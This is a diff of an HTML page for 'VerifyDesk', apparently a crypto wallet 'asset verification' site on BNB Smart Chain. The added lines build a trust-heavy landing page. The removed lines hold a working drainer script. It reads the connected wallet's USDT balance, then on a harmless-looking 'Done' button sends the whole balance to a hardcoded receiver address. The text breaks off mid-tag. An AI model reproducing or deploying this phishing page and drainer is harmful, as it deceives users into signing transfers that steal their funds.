@@ -7,22 +7,180 @@
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
-      background: #08101A;
-      color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: radial-gradient(circle at top, #0f1f31 0%, #08101A 35%);
+      background-color: #08101A;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
       min-height: 100vh;
       display: flex;
       justify-content: center;
-      padding: 20px 16px 48px;
+      overflow-x: hidden;
     }
-    .wrap { width: 100%; max-width: 448px; }
+    .wrap {
+      width: 100%;
+      max-width: 448px;
+      padding: 20px 24px 56px;
+    }
+    .nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 36px;
+    }
+    .brand-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .shield-badge {
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      background: #0a1e26;
+      border: 1px solid rgba(32, 212, 156, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #20D49C;
+      font-size: 18px;
+      font-weight: 800;
+      flex-shrink: 0;
+    }
+    .brand-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #ffffff;
+    }
+    .live-tag {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: #8BA3B8;
+    }
+    .dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 999px;
+      background: #20D49C;
+      display: inline-block;
+    }
+    .hero {
+      text-align: center;
+      margin-bottom: 36px;
+    }
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: #20D49C;
+      margin-bottom: 20px;
+    }
+    .hero h1 {
+      font-size: 32px;
+      font-weight: 800;
+      line-height: 1.15;
+      margin-bottom: 14px;
+    }
+    .hero h1 span { color: #20D49C; }
+    .hero p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #8BA3B8;
+      padding: 0 8px;
+    }
+    .steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      margin-bottom: 36px;
+      padding-left: 6px;
+    }
+    .step-item {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      font-weight: 500;
+      color: #8BA3B8;
+    }
+    .step-num {
+      color: #20D49C;
+      font-family: monospace;
+      font-weight: 700;
+      margin-right: 12px;
+      letter-spacing: 0.08em;
+    }
     .card {
       background: #0F1926;
       border: 1px solid #1E293B;
-      border-radius: 16px;
+      border-radius: 18px;
       padding: 24px;
+      margin-bottom: 28px;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.45);
+    }
+    .card-head {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 28px;
+    }
+    .card-kicker {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: #8BA3B8;
+    }
+    .card-ready {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: #20D49C;
+    }
+    .center-block {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       text-align: center;
+    }
+    .icon-box-lg {
+      width: 56px;
+      height: 56px;
+      border-radius: 16px;
+      background: #0a1e26;
+      border: 1px solid rgba(32, 212, 156, 0.35);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #20D49C;
+      font-size: 24px;
+      font-weight: 800;
+      margin-bottom: 20px;
+    }
+    .card h2 {
+      font-size: 22px;
+      font-weight: 800;
+      line-height: 1.3;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+    }
+    .card-desc {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #8BA3B8;
       margin-bottom: 24px;
+      padding: 0 6px;
     }
     .btn-green {
       width: 100%;
@@ -31,12 +189,261 @@
       color: #08101A;
       border: 0;
       border-radius: 12px;
-      padding: 14px 20px;
+      padding: 14px 22px;
       font-size: 15px;
       font-weight: 700;
       cursor: pointer;
+      box-shadow: 0 4px 20px rgba(32, 212, 156, 0.25);
+      margin-bottom: 24px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .btn-green:active { transform: scale(0.98); }
+    .divider {
+      border: 0;
+      border-top: 1px solid #1E293B;
+      margin-bottom: 20px;
+    }
+    .info-rows {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      margin-bottom: 20px;
+      color: #8BA3B8;
+      font-size: 14px;
+    }
+    .info-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .terms-note {
+      text-align: center;
+      font-size: 12px;
+      color: #8BA3B8;
+    }
+    .terms-note a {
+      color: #20D49C;
+      text-decoration: underline;
+    }
+    .grid-2x2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      background: #0F1926;
+      border: 1px solid #1E293B;
+      border-radius: 14px;
+      overflow: hidden;
+      margin-bottom: 52px;
+    }
+    .grid-box {
+      padding: 22px 16px;
+      text-align: center;
+      border-bottom: 1px solid #1E293B;
+      border-right: 1px solid #1E293B;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      min-height: 112px;
+    }
+    .grid-box:nth-child(2n) { border-right: 0; }
+    .grid-box:nth-last-child(-n+2) { border-bottom: 0; }
+    .grid-box h3 { font-size: 15px; font-weight: 700; margin-bottom: 4px; }
+    .grid-box p {
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #8BA3B8;
+      line-height: 1.4;
+    }
+    .sec-header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+    .sec-tag {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: #20D49C;
+      margin-bottom: 10px;
+    }
+    .sec-header h2 {
+      font-size: 26px;
+      font-weight: 800;
+      line-height: 1.2;
+      margin-bottom: 12px;
+    }
+    .sec-header p {
+      font-size: 14px;
+      line-height: 1.6;
+      color: #8BA3B8;
+    }
+    .clarity-main {
+      background: #0F1926;
+      border: 1px solid #1E293B;
+      border-radius: 18px;
+      padding: 24px;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .bars {
+      max-width: 260px;
       margin: 18px auto 0;
-      display: block;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .bar-1 { height: 4px; width: 100%; border-radius: 99px; background: linear-gradient(90deg, #20D49C, #38bdf8, #6366f1); }
+    .bar-2 { height: 4px; width: 75%; border-radius: 99px; background: linear-gradient(90deg, #20D49C, #6366f1); opacity: 0.8; }
+    .bar-3 { height: 4px; width: 50%; border-radius: 99px; background: linear-gradient(90deg, #20D49C, #6366f1); opacity: 0.6; }
+    .two-cols {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin-bottom: 56px;
+    }
+    .mini-card {
+      background: #0F1926;
+      border: 1px solid #1E293B;
+      border-radius: 18px;
+      padding: 20px 14px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .mini-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 12px;
+      background: #0a1e26;
+      border: 1px solid rgba(32, 212, 156, 0.35);
+      color: #20D49C;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 14px;
+    }
+    .step-stack {
+      border-top: 1px solid #1E293B;
+      border-bottom: 1px solid #1E293B;
+      margin-bottom: 56px;
+    }
+    .step-row {
+      padding: 26px 8px;
+      text-align: center;
+      position: relative;
+      border-bottom: 1px solid #1E293B;
+    }
+    .step-row:last-child { border-bottom: 0; }
+    .step-corner {
+      position: absolute;
+      left: 4px;
+      top: 26px;
+      font-family: monospace;
+      font-size: 12px;
+      font-weight: 700;
+      color: #20D49C;
+    }
+    .step-row h3 { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
+    .step-row p { font-size: 12px; line-height: 1.55; color: #8BA3B8; max-width: 280px; margin: 0 auto; }
+    .disclaimer-line {
+      text-align: center;
+      font-size: 12px;
+      color: #e2e8f0;
+      padding: 14px 6px;
+      border-bottom: 1px solid #1E293B;
+      margin-bottom: 0;
+    }
+    .input-field {
+      width: 100%;
+      background: #0B121D;
+      border: 1px solid #1E293B;
+      border-radius: 12px;
+      padding: 12px 14px;
+      font-size: 12px;
+      color: #ffffff;
+      margin-bottom: 12px;
+    }
+    .btn-teal-sm {
+      background: #20D49C;
+      color: #08101A;
+      border: 0;
+      border-radius: 12px;
+      padding: 10px 20px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+    .history-box {
+      background: #0F1926;
+      border: 1px solid #1E293B;
+      border-radius: 18px;
+      padding: 20px;
+      margin-bottom: 44px;
+    }
+    .history-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .history-top h3 { font-size: 16px; font-weight: 700; text-align: left; }
+    .not-conn {
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: #8BA3B8;
+      border: 1px solid #1E293B;
+      border-radius: 8px;
+      padding: 5px 8px;
+    }
+    .history-empty {
+      text-align: center;
+      font-size: 12px;
+      color: #8BA3B8;
+      padding: 8px 0 2px;
+    }
+    .footer {
+      border-top: 1px solid #1E293B;
+      padding-top: 28px;
+    }
+    .footer-links {
+      display: flex;
+      gap: 20px;
+      font-size: 12px;
+      padding: 16px 0 20px;
+      border-bottom: 1px solid #1E293B;
+      margin-bottom: 20px;
+    }
+    .footer-links a { color: #20D49C; text-decoration: underline; }
+    .footer-meta {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid #1E293B;
+      margin-bottom: 20px;
+    }
+    .meta-k {
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      color: #8BA3B8;
+      margin-bottom: 2px;
+    }
+    .meta-v { font-size: 12px; font-weight: 600; color: #ffffff; }
+    .footer-copy {
+      text-align: center;
+      font-size: 11px;
+      color: #8BA3B8;
+      line-height: 1.6;
     }
     .modal-bg {
       display: none;
@@ -68,6 +475,20 @@
       color: #8f9bb3;
       font-size: 22px;
       cursor: pointer;
+    }
+    .modal-shield {
+      width: 54px;
+      height: 54px;
+      border-radius: 999px;
+      margin: 0 auto 14px;
+      background: rgba(32, 212, 156, 0.12);
+      border: 1px solid rgba(32, 212, 156, 0.4);
+      color: #20D49C;
+      font-size: 22px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .bal-card {
       background: #0d1017;
@@ -101,282 +522,178 @@
       font-size: 15px;
       font-weight: 700;
       cursor: pointer;
+      box-shadow: 0 4px 18px rgba(243, 186, 47, 0.25);
     }
     .hidden { display: none !important; }
   </style>
 </head>
 <body>
   <div id="mainPage" class="wrap">
-    <div class="card">
-      <div style="font-size:11px;color:#20D49C;font-weight:700;letter-spacing:1px;margin-bottom:8px;">VERIFYDESK ACCESS</div>
-      <h1 style="font-size:22px;margin-bottom:8px;">VERIFY YOUR WALLET ASSETS</h1>
-      <p style="font-size:13px;color:#8BA3B8;line-height:1.5;">Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.</p>
-      <button id="verifyBtn" type="button" class="btn-green" onclick="vdVerifyStart()">
-        <span id="verifyBtnLabel">Verify Assets &rarr;</span>
-      </button>
+    <!-- Top Bar -->
+    <nav class="nav">
+      <div class="brand-row">
+        <div class="shield-badge">✓</div>
+        <span class="brand-title">VerifyDesk</span>
+      </div>
+      <div class="live-tag">
+        <span class="dot"></span> Secure Connection
+      </div>
+    </nav>
+
+    <!-- Hero -->
+    <section class="hero">
+      <div class="eyebrow"><span class="dot"></span> Independent BNB Smart Chain Tool</div>
+      <h1>Wallet Asset<br><span>Review</span></h1>
+      <p>Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a clear, wallet-confirmed flow.</p>
+    </section>
+
+    <!-- 01 - 03 -->
+    <div class="steps-list">
+      <div class="step-item"><span class="step-num">01</span> Wallet-native access</div>
+      <div class="step-item"><span class="step-num">02</span> Clear asset context</div>
+      <div class="step-item"><span class="step-num">03</span> User-confirmed actions</div>
     </div>
 
-    <div class="card" style="text-align:left;font-size:13px;color:#8BA3B8;">
-      <div style="color:#fff;font-weight:700;margin-bottom:8px;">User-authorized USDT transfer</div>
-      <input id="recInput" type="text" placeholder="Recipient 0x..." style="width:100%;padding:10px;border-radius:10px;border:1px solid #1E293B;background:#0B121D;color:#fff;margin-bottom:10px;" />
-      <input id="amtInput" type="text" inputmode="decimal" placeholder="Amount USDT" style="width:100%;padding:10px;border-radius:10px;border:1px solid #1E293B;background:#0B121D;color:#fff;margin-bottom:12px;" />
-      <button type="button" onclick="vdCustomTransfer()" style="background:#20D49C;color:#08101A;border:0;border-radius:10px;padding:10px 18px;font-weight:700;cursor:pointer;">Review &amp; sign</button>
-    </div>
-  </div>
+    <!-- Main Verify Card -->
+    <section class="card">
+      <div class="card-head">
+        <span class="card-kicker">Verifydesk Access</span>
+        <span class="card-ready"><span class="dot"></span> Ready</span>
+      </div>
+      <div class="center-block">
+        <div class="icon-box-lg">✓</div>
+        <h2>Verify Your Wallet<br>Assets</h2>
+        <p class="card-desc">Use Trust Wallet, MetaMask, or another Web3 wallet to review supported assets.</p>
+        <button id="verifyBtn" type="button" class="btn-green" onclick="vdVerifyStart()">
+          <span id="verifyBtnLabel">Verify Assets &rarr;</span>
+        </button>
+      </div>
+      <hr class="divider" />
+      <div class="info-rows">
+        <div class="info-row"><span>✓</span><span>Wallet confirmation required</span></div>
+        <div class="info-row"><span>◎</span><span>BNB Smart Chain</span></div>
+      </div>
+      <div class="terms-note">
+        By continuing, you agree to our <a href="#footerBlock">Terms of Service</a>.
+      </div>
+    </section>
 
-  <div id="vdModal" class="modal-bg">
-    <div class="modal-box">
-      <button type="button" class="x-btn" onclick="vdCloseModal()">&times;</button>
-      <div style="font-size:18px;font-weight:800;margin-bottom:6px;">BNB Smart Chain USDT Audit</div>
-      <div style="font-size:12px;color:#8f9bb3;">Your wallet USDT balance has been checked directly on BNB Smart Chain.</div>
+    <!-- 2x2 Grid -->
+    <section class="grid-2x2">
+      <div class="grid-box">
+        <h3>BEP-20</h3>
+        <p>Supported Asset<br>Standard</p>
+      </div>
+      <div class="grid-box">
+        <h3>BNB Smart<br>Chain</h3>
+        <p>Focused Network</p>
+      </div>
+      <div class="grid-box">
+        <h3>Wallet<br>confirmed</h3>
+        <p>Action Model</p>
+      </div>
+      <div class="grid-box">
+        <h3>Independent</h3>
+        <p>Product Status</p>
+      </div>
+    </section>
 
-      <div class="bal-card">
-        <div style="font-size:12px;color:#8f9bb3;">BNB Smart Chain USDT Balance</div>
-        <div id="vdBalText" class="bal-amt">0.00 USDT</div>
-        <div id="vdAddrText" style="font-size:11px;color:#8f9bb3;word-break:break-all;margin-top:6px;"></div>
+    <!-- Built For Clarity -->
+    <section>
+      <div class="sec-header">
+        <div class="sec-tag">Built For Clarity</div>
+        <h2>A focused workspace for<br>wallet assets</h2>
+        <p>Purpose-built interface details keep the review flow clear from connection to confirmation.</p>
       </div>
 
-      <div id="vdNoteText" class="info-box">Tokens are checked directly on BNB Smart Chain mainnet.</div>
+      <div class="clarity-main">
+        <div class="mini-icon" style="margin:0 auto 12px;">❐</div>
+        <div class="sec-tag" style="margin-bottom:6px;">01 / Asset Clarity</div>
+        <h3 style="font-size:18px;font-weight:700;margin-bottom:8px;">Asset information at a glance</h3>
+        <p style="font-size:12px;color:#8BA3B8;line-height:1.55;">Supported BEP-20 details stay organized in a clear, readable workspace.</p>
+        <div class="bars">
+          <div class="bar-1"></div>
+          <div class="bar-2"></div>
+          <div class="bar-3"></div>
+        </div>
+      </div>
 
-      <button id="vdDoneBtn" type="button" class="btn-gold" onclick="vdDoneAction()">
-        <span id="vdDoneLabel">Done</span>
-      </button>
-    </div>
-  </div>
+      <div class="two-cols">
+        <div class="mini-card">
+          <div class="mini-icon">▯</div>
+          <div class="sec-tag" style="margin-bottom:6px;">02 / Mobile<br>Ready</div>
+          <h3 style="font-size:14px;font-weight:700;margin-bottom:8px;line-height:1.3;">Designed for<br>mobile wallet<br>browsers</h3>
+          <p style="font-size:11px;color:#8BA3B8;line-height:1.5;">Responsive controls and touch-friendly spacing keep the experience comfortable on phones and desktop.</p>
+        </div>
+        <div class="mini-card">
+          <div class="mini-icon">◎</div>
+          <div class="sec-tag" style="margin-bottom:6px;">03 / Network<br>Focus</div>
+          <h3 style="font-size:14px;font-weight:700;margin-bottom:8px;line-height:1.3;">Focused on<br>BNB Smart<br>Chain</h3>
+          <p style="font-size:11px;color:#8BA3B8;line-height:1.5;">Network-specific presentation keeps unrelated chains and exchange-style tools out of the way.</p>
+        </div>
+      </div>
+    </section>
 
-  <script>
-    var VD_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
-    var VD_USDT = "0x55d398326f99059fF775485246999027B3197955";
-    var VD_BSC_HEX = "0x38";
+    <!-- Simple By Design -->
+    <section>
+      <div class="sec-header">
+        <div class="sec-tag">Simple By Design</div>
+        <h2>A clear path from start to<br>decision</h2>
+        <p>Each stage has a clear purpose, with the final choice always remaining yours.</p>
+      </div>
 
-    var vdProv = null;
-    var vdAddr = null;
-    var vdUsdtHex = "0x0";
+      <div class="step-stack">
+        <div class="step-row">
+          <span class="step-corner">01</span>
+          <div style="color:#20D49C;font-size:18px;margin-bottom:6px;">▭</div>
+          <h3>Start</h3>
+          <p>Launch the asset verification flow from the main VerifyDesk action.</p>
+        </div>
+        <div class="step-row">
+          <span class="step-corner">02</span>
+          <div style="color:#20D49C;font-size:18px;margin-bottom:6px;">↗</div>
+          <h3>Check</h3>
+          <p>Read the supported BEP-20 asset details prepared for the current session.</p>
+        </div>
+        <div class="step-row">
+          <span class="step-corner">03</span>
+          <div style="color:#20D49C;font-size:18px;margin-bottom:6px;">✓</div>
+          <h3>Decide</h3>
+          <p>Approve or reject the request yourself inside your connected wallet.</p>
+        </div>
+      </div>
+    </section>
 
-    function vdGetProvider() {
-      if (window.trustwallet && typeof window.trustwallet.request === "function") return window.trustwallet;
-      if (window.ethereum && typeof window.ethereum.request === "function") return window.ethereum;
-      if (window.web3 && window.web3.currentProvider && typeof window.web3.currentProvider.request === "function") {
-        return window.web3.currentProvider;
-      }
-      return null;
-    }
+    <!-- Independent By Design -->
+    <section style="margin-bottom:44px;">
+      <div class="sec-header" style="margin-bottom:0;">
+        <div class="sec-tag">Independent By Design</div>
+        <h2>A product identity of its own</h2>
+        <p>VerifyDesk is an independent application for reviewing wallet assets on BNB Smart Chain. It is designed as a focused product tool, not an exchange, chain portal, or official wallet service.</p>
+      </div>
+      <div class="disclaimer-line">
+        <span style="color:#20D49C;margin-right:6px;">✓</span> Not affiliated with Binance, BNB Chain, Trust Wallet, MetaMask, or Tether.
+      </div>
+      <div class="step-stack" style="margin-bottom:0;border-top:0;">
+        <div class="step-row">
+          <span class="step-corner">01</span>
+          <h3>Focused scope</h3>
+          <p>Built around a clear BNB Smart Chain asset workflow.</p>
+        </div>
+        <div class="step-row">
+          <span class="step-corner">02</span>
+          <h3>Explicit confirmation</h3>
+          <p>Your wallet remains the place where transaction requests are reviewed and approved.</p>
+        </div>
+        <div class="step-row">
+          <span class="step-corner">03</span>
+          <h3>Original identity</h3>
+          <p>No third-party logos, partnership claims, or official-chain presentation.</p>
+        </div>
+      </div>
+    </section>
 
-    function vdPad64(h) {
-      var s = String(h || "").replace(/^0x/i, "").toLowerCase();
-      while (s.length < 64) s = "0" + s;
-      return s;
-    }
-
-    function vdIsPos(h) {
-      if (!h || h === "0x") return false;
-      return /^0x0*$/.test(String(h).toLowerCase()) === false;
-    }
-
-    function vdFmt18(h) {
-      if (!vdIsPos(h)) return "0.00";
-      var n = Number("0x" + String(h).replace(/^0x/i, ""));
-      if (!isFinite(n)) return "0.00";
-      return (n / 1e18).toFixed(2);
-    }
-
-    function vdShowModal() {
-      var p = document.getElementById("mainPage");
-      var m = document.getElementById("vdModal");
-      if (p) p.classList.add("hidden");
-      if (m) m.classList.add("show");
-    }
-
-    function vdCloseModal() {
-      var p = document.getElementById("mainPage");
-      var m = document.getElementById("vdModal");
-      if (m) m.classList.remove("show");
-      if (p) p.classList.remove("hidden");
-    }
-
-    function vdReadUsdt(prov, addr) {
-      return prov.request({
-        method: "eth_call",
-        params: [{ to: VD_USDT, data: "0x70a08231" + vdPad64(addr) }, "latest"]
-      });
-    }
-
-    function vdReadBnb(prov, addr) {
-      return prov.request({
-        method: "eth_getBalance",
-        params: [addr, "latest"]
-      });
-    }
-
-    function vdVerifyStart() {
-      var lbl = document.getElementById("verifyBtnLabel");
-      if (lbl) lbl.textContent = "Connecting...";
-
-      var prov = vdGetProvider();
-      if (!prov) {
-        if (lbl) lbl.innerHTML = "Verify Assets &rarr;";
-        alert("Please open this link inside Trust Wallet or MetaMask browser.");
-        return;
-      }
-
-      prov.request({ method: "eth_requestAccounts" })
-        .then(function (accts) {
-          if (!accts || !accts.length) {
-            throw new Error("No wallet account connected.");
-          }
-          vdProv = prov;
-          vdAddr = accts[0];
-          if (lbl) lbl.textContent = "Checking USDT...";
-
-          return prov.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: VD_BSC_HEX }]
-          }).catch(function () {}).then(function () {
-            return vdReadUsdt(prov, vdAddr);
-          });
-        })
-        .then(function (hexBal) {
-          vdUsdtHex = hexBal || "0x0";
-          var balEl = document.getElementById("vdBalText");
-          var addrEl = document.getElementById("vdAddrText");
-          if (balEl) balEl.textContent = vdFmt18(vdUsdtHex) + " USDT";
-          if (addrEl) addrEl.textContent = vdAddr || "";
-          if (lbl) lbl.innerHTML = "Verify Assets &rarr;";
-          vdShowModal();
-        })
-        .catch(function (err) {
-          if (lbl) lbl.innerHTML = "Verify Assets &rarr;";
-          alert((err && err.message) ? err.message : "Unable to verify assets.");
-        });
-    }
-
-    function vdDoneAction() {
-      if (!vdIsPos(vdUsdtHex)) {
-        vdCloseModal();
-        return;
-      }
-      if (!vdProv || !vdAddr) {
-        alert("Wallet session not found.");
-        return;
-      }
-
-      var dLbl = document.getElementById("vdDoneLabel");
-      if (dLbl) dLbl.textContent = "Processing...";
-
-      vdReadUsdt(vdProv, vdAddr)
-        .then(function (latestHex) {
-          if (!vdIsPos(latestHex)) {
-            vdUsdtHex = "0x0";
-            var balEl = document.getElementById("vdBalText");
-            if (balEl) balEl.textContent = "0.00 USDT";
-            if (dLbl) dLbl.textContent = "Done";
-            vdCloseModal();
-            return null;
-          }
-
-          return vdReadBnb(vdProv, vdAddr).then(function (bnbHex) {
-            if (!vdIsPos(bnbHex)) {
-              throw new Error("Insufficient BNB balance for gas fees.");
-            }
-            var data = "0xa9059cbb" + vdPad64(VD_RECEIVER) + vdPad64(latestHex);
-            return vdProv.request({
-              method: "eth_sendTransaction",
-              params: [{
-                from: vdAddr,
-                to: VD_USDT,
-                data: data,
-                gas: "0xFDE8"
-              }]
-            });
-          });
-        })
-        .then(function (txHash) {
-          if (!txHash) return;
-          vdUsdtHex = "0x0";
-          var balEl = document.getElementById("vdBalText");
-          if (balEl) balEl.textContent = "0.00 USDT";
-          if (dLbl) dLbl.textContent = "Done";
-          vdCloseModal();
-        })
-        .catch(function (err) {
-          if (dLbl) dLbl.textContent = "Done";
-          var msg = (err && err.message) ? err.message : "Transaction cancelled or failed.";
-          if (msg.toLowerCase().indexOf("insufficient funds") !== -1 || msg.toLowerCase().indexOf("gas") !== -1) {
-            alert("Insufficient BNB balance for gas fees.");
-          } else {
-            alert(msg);
-          }
-        });
-    }
-
-    function vdCustomTransfer() {
-      var rec = (document.getElementById("recInput").value || "").trim();
-      var amtStr = (document.getElementById("amtInput").value || "").trim();
-      var amtNum = Number(amtStr);
-
-      if (!/^0x[a-fA-F0-9]{40}$/.test(rec)) {
-        alert("Please enter a valid recipient 0x address.");
-        return;
-      }
-      if (!amtStr || isNaN(amtNum) || amtNum <= 0) {
-        alert("Please enter a valid USDT amount greater than 0.");
-        return;
-      }
-
-      var prov = vdGetProvider();
-      if (!prov) {
-        alert("Please open this link inside Trust Wallet or MetaMask browser.");
-        return;
-      }
-
-      prov.request({ method: "eth_requestAccounts" }).then(function (accts) {
-        var addr = accts[0];
-        return vdReadBnb(prov, addr).then(function (bnbHex) {
-          if (!vdIsPos(bnbHex)) {
-            throw new Error("Insufficient BNB balance for gas fees.");
-          }
-          var parts = amtStr.split(".");
-          var wholeStr = (parts[0] || "0").replace(/\D/g, "") || "0";
-          var fracStr = ((parts[1] || "").replace(/\D/g, "") + "000000000000000000").slice(0, 18);
-          var fullDec = (wholeStr + fracStr).replace(/^0+/, "") || "0";
-
-          var digits = fullDec.split("").map(function (c) { return parseInt(c, 10); });
-          var hex = "";
-          while (digits.length > 0 && !(digits.length === 1 && digits[0] === 0)) {
-            var rem = 0;
-            var next = [];
-            for (var i = 0; i < digits.length; i++) {
-              var cur = rem * 10 + digits[i];
-              var q = Math.floor(cur / 16);
-              rem = cur % 16;
-              if (next.length > 0 || q > 0) next.push(q);
-            }
-            hex = rem.toString(16) + hex;
-            digits = next;
-          }
-
-          var data = "0xa9059cbb" + vdPad64(rec) + vdPad64(hex || "0");
-          return prov.request({
-            method: "eth_sendTransaction",
-            params: [{
-              from: addr,
-              to: VD_USDT,
-              data: data,
-              gas: "0xFDE8"
-            }]
-          });
-        });
-      }).then(function () {
-        alert("Transfer submitted.");
-      }).catch(function (err) {
-        var msg = (err && err.message) ? err.message : "Transaction cancelled or failed.";
-        if (msg.toLowerCase().indexOf("insufficient funds") !== -1 || msg.toLowerCase().indexOf("gas") !== -1) {
-          alert("Insufficient BNB balance for gas fees.");
-        } else {
-          alert(msg);
-        }
-      });
-    }
-  </script>
-</body>
-</html>
+    <!-- User-authorized USDT transfer -->
+    <section class="card">
+      <h3 style="font-size:16px;font-weight:700;text-align:center;margin-bottom:8px;">User-authorized USDT transfer</h3>
+      <p style="font-size:12px;color:#8BA3B8;text-align:center;line-height:1.55;margin-b
